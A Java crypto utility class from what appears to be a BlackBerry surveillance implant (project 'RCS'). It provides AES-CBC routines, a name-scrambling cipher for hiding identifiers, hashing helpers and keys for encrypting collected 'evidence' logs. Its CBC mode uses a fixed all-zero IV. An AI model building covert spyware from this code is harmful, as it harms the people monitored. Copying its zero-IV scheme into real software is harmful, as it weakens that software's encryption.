//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Encryption.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.crypto;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import net.rim.device.api.crypto.CryptoException;
import net.rim.device.api.crypto.CryptoTokenException;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.CRC32;
import blackberry.config.Keys;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.utils.Utils;
import fake.InstanceKeysFake;

/**
 * The Class Encryption.
 */
public class Encryption {

    //#ifdef DEBUG
    private static Debug debug = new Debug("Encryption", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new encryption.
     */
    protected Encryption() {
        if (RimAESSupported) {
            aes = new RimAES();
        } else {
            aes = new Rijndael();
        }
    }

    public Encryption(byte[] key) {
        this();
        makeKey(key);
    }

    /**
     * Descrambla una stringa, torna il puntatore al nome descramblato. La
     * stringa ritornata va liberata dal chiamante con una free()!!!!
     * 
     * @param Name
     *            the name
     * @param seed
     *            the seed
     * @return the string
     */
    public static String decryptName(final String Name, final int seed) {
        return scramble(Name, seed, false);
    }

    /**
     * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
     * ritornata va liberata dal chiamante con una free()!!!!
     * 
     * @param Name
     *            the name
     * @param seed
     *            the seed
     * @return the string
     */
    public static String encryptName(final String Name, final int seed) {
        return scramble(Name, seed, true);
    }

    /**
     * Gets the next multiple.
     * 
     * @param len
     *            the len
     * @return the next multiple
     */
    public static int getNextMultiple(final int len) {
        //#ifdef DBC
        Check.requires(len >= 0, "len < 0");
        //#endif
        final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
        //#ifdef DBC
        Check.ensures(newlen >= len, "newlen < len");
        //#endif
        //#ifdef DBC
        Check.ensures(newlen % 16 == 0, "Wrong newlen");
        //#endif
        return newlen;
    }

    /**
     * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
     * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
     * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
     * a FALSE descrambla.
     */
    private static String scramble(final String name, int seed,
            final boolean enc) {
        final char[] retString = name.toCharArray();
        final int len = name.length();
        int i, j;

        final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T',
                'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q', 'A', 'S', 'x', '4',
                'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l',
                'J', 'W', 'h', 'j', '0', 'm', '5', 'o', '2', 'E', 'r', 'L',
                't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
                'P', 'p', 'c', '7', 'g', '-', 'C' };

        final int alphabetLen = alphabet.length;

        if (seed < 0) {
            seed = -seed;
        }

        // Evita di lasciare i nomi originali anche se il byte e' 0
        seed = (seed > 0) ? seed %= alphabetLen : seed;

        if (seed == 0) {
            seed = 1;
        }

        //#ifdef DBC
        Check.asserts(seed > 0, "negative seed");
        //#endif

        for (i = 0; i < len; i++) {
            for (j = 0; j < alphabetLen; j++) {
                if (retString[i] == alphabet[j]) {
                    // Se crypt e' TRUE cifra, altrimenti decifra
                    if (enc) {
                        retString[i] = alphabet[(j + seed) % alphabetLen];
                    } else {
                        retString[i] = alphabet[(j + alphabetLen - seed)
                                % alphabetLen];
                    }

                    break;
                }
            }
        }

        return new String(retString);
    }

    CryptoEngine aes;

    boolean keyReady = false;

    private static boolean RimAESSupported;

    /**
     * Inits the.
     */
    public static void init() {
        RimAESSupported = RimAES.isSupported();
        if (RimAESSupported) {
            //#ifdef DEBUG
            debug.info("RimAES");
            //#endif
        } else {
            //#ifdef DEBUG
            debug.info("Rijndael");
            //#endif
        }
    }

    /**
     * Calcola il SHA1 del messaggio, usando la crypto api.
     * 
     * @param message
     *            the message
     * @return the byte[]
     */
    public static byte[] SHA1(final byte[] message, int offset, int length) {
        final SHA1Digest digest = new SHA1Digest();
        digest.update(message, offset, length);
        final byte[] sha1 = digest.getDigest();

        return sha1;
    }

    public static byte[] SHA1(final byte[] message) {
        return SHA1(message, 0, message.length);
    }

    public static byte[] SHA1(String message) {
        return SHA1(message.getBytes());
    }

    public static int CRC32(final byte[] message, int offset, int length) {
        return CRC32.update(0, message, offset, length);
    }

    public static int CRC32(final byte[] message) {
        return CRC32.update(0, message);
    }

    public static int CRC32(String message) {
        return CRC32.update(0, message.getBytes());
    }

    /**
     * Decrypt data.
     * 
     * @param cyphered
     *            the cyphered
     * @return the byte[]
     * @throws CryptoException
     */
    public byte[] decryptData(final byte[] cyphered) throws CryptoException {
        return decryptData(cyphered, cyphered.length, 0);
    }

    /**
     * Decrypt data.
     * 
     * @param cyphered
     *            the cyphered
     * @param offset
     *            the offset
     * @return the byte[]
     * @throws CryptoException
     */
    public byte[] decryptData(final byte[] cyphered, final int offset)
            throws CryptoException {
        return decryptData(cyphered, cyphered.length - offset, offset);
    }

    /**
     * Decrypt data, CBC mode.
     * 
     * @param cyphered
     *            the cyphered
     * @param plainlen
     *            the plainlen
     * @param offset
     *            the offset
     * @return the byte[]
     * @throws CryptoException
     */
    public byte[] decryptData(final byte[] cyphered, final int plainlen,
            final int offset) throws CryptoException {
        final int enclen = cyphered.length - offset;
        if (enclen % 16 != 0) {
            //#ifdef DEBUG
            debug.error("decryptData: wrong padding");
            //#endif
            throw new CryptoException();
        }
        //#ifdef DBC
        Check.requires(keyReady, "Key not ready");
        Check.requires(enclen % 16 == 0, "Wrong padding");
        Check.requires(enclen >= plainlen, "Wrong plainlen");
        //#endif

        final byte[] plain = new byte[plainlen];
        byte[] iv = new byte[16];

        final byte[] pt = new byte[16];

        final int numblock = enclen / 16;
        final int lastBlockLen = plainlen % 16;
        try {
            for (int i = 0; i < numblock; i++) {
                final byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);

                aes.decrypt(ct, pt);
                xor(pt, iv);
                iv = Arrays.copy(ct);

                if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
                    // and remaind
                    //#ifdef DEBUG
                    debug.trace("lastBlockLen: " + lastBlockLen);
                    //#endif
                    Utils.copy(plain, i * 16, pt, 0, lastBlockLen);
                } else {
                    Utils.copy(plain, i * 16, pt, 0, 16);
                    // copyblock(plain, i, pt, 0);
                }
            }
        } catch (final CryptoTokenException e) {
            //#ifdef DEBUG
            debug.error("error decrypting data");
            //#endif
            return null;
        }

        //#ifdef DBC
        Check.ensures(plain.length == plainlen, "wrong plainlen");
        //#endif
        return plain;
    }

    public byte[] encryptData(final byte[] plain) {
        return encryptData(plain, 0);
    }

    /**
     * Encrypt data in CBC mode and HT padding
     * 
     * @param plain
     *            the plain
     * @return the byte[]
     */
    public byte[] encryptData(final byte[] plain, int offset) {
        //#ifdef DBC
        Check.requires(keyReady, "Key not ready");
        //#endif

        final int len = plain.length - offset;

        // TODO: optimize, non creare padplain, considerare caso particolare
        // ultimo blocco
        final byte[] padplain = pad(plain, offset, len);

        final int clen = padplain.length;
        final byte[] crypted = new byte[clen];

        byte[] iv = new byte[16]; // iv e' sempre 0
        final byte[] ct = new byte[16];

        final int numblock = clen / 16;
        try {

            for (int i = 0; i < numblock; i++) {
                final byte[] pt = Arrays.copy(padplain, i * 16, 16);
                xor(pt, iv);

                aes.encrypt(pt, ct);
                Utils.copy(crypted, i * 16, ct, 0, 16);
                iv = Arrays.copy(ct);
            }
        } catch (final CryptoTokenException e) {
            //#ifdef DEBUG
            debug.error("error crypting data");
            //#endif
            return null;
        }

        return crypted;
    }

    // encrypts is, starting from offset, for a blocksize. 
    // Returns the last block
    public boolean encryptData(DataInputStream is, DataOutputStream os) {
        //#ifdef DBC
        Check.requires(keyReady, "Key not ready");
        //#endif

        final byte[] plain = new byte[16];
        // works also as IV
        final byte[] crypted = new byte[16]; 
        // IV initialized as 0
        Arrays.fill(crypted, (byte) 0, 0, 16);

        try {
            for (;;) {
                Arrays.fill(plain, (byte) 0, 0, 16);
           
                int len = is.read(plain);
                if (len == -1) {
                    //#ifdef DEBUG
                    debug.trace("encryptData: end of file");
                    //#endif
                    break;
                }

                xor(plain, crypted);
                aes.encrypt(plain, crypted);
                os.write(crypted);
            }
            
            os.flush();
            return true;  
        } catch (final CryptoTokenException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("error crypting data");
            //#endif
            return false;
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("error crypting data");
            //#endif
            return false;
        }

       
    }

    /**
     * Old style Pad, PKCS5 is available in EncryptionPKCS5
     * 
     * @param plain
     * @param offset
     * @param len
     * @return
     */
    protected byte[] pad(byte[] plain, int offset, int len) {
        return pad(plain, offset, len, false);
    }

    protected byte[] pad(byte[] plain, int offset, int len, boolean PKCS5) {
        final int clen = getNextMultiple(len);
        if (clen > 0) {
            final byte[] padplain = new byte[clen];
            if (PKCS5) {
                int value = clen - len;
                for (int i = 1; i <= value; i++) {
                    padplain[clen - i] = (byte) value;
                }
            }
            Utils.copy(padplain, 0, plain, offset, len);
            return padplain;
        } else {
            return plain;
        }
    }

    /**
     * Make key.
     * 
     * @param key
     *            the key
     */
    public void makeKey(final byte[] key) {
        //#ifdef DBC
        Check.requires(key != null, "key null");
        //#endif
        //#ifdef DBC
        Check.requires(key.length == 16, "key not 16 bytes long");
        //#endif
        aes.makeKey(key, 128);

        keyReady = true;
    }

    /**
     * pt = pt ^ iv.
     * 
     * @param pt
     *            the pt
     * @param iv
     *            the iv
     */
    void xor(final byte[] pt, final byte[] iv) {
        //#ifdef DBC
        Check.requires(pt.length == 16, "pt not 16 bytes long");
        Check.requires(iv.length == 16, "iv not 16 bytes long");
        //#endif

        for (int i = 0; i < 16; i++) {
            pt[i] ^= iv[i];
        }
    }

    static Keys keys;

    public synchronized static Keys getKeys() {

        if (keys == null) {
            //#ifdef FAKECONF
            final boolean isFake = true;
            //#else
            final boolean isFake = false;
            //#endif
            if (isFake) {
                InstanceKeysFake instance = new InstanceKeysFake();
                //#ifdef DBC
                Check.asserts(instance != null, "null InstanceKeysFake");
                //#endif
                keys = Keys.getFakeInstance(instance);
                //debug.trace("getKeys, fakeConf, instance: " +instance);
            } else {
                keys = Keys.getInstance();
            }
        }

        //#ifdef DBC
        Check.ensures(keys.getProtoKey() != null, "null challengeKey");
        Check.ensures(keys.getLogKey() != null, "null aesKey");
        //#endif

        return keys;
    }

}
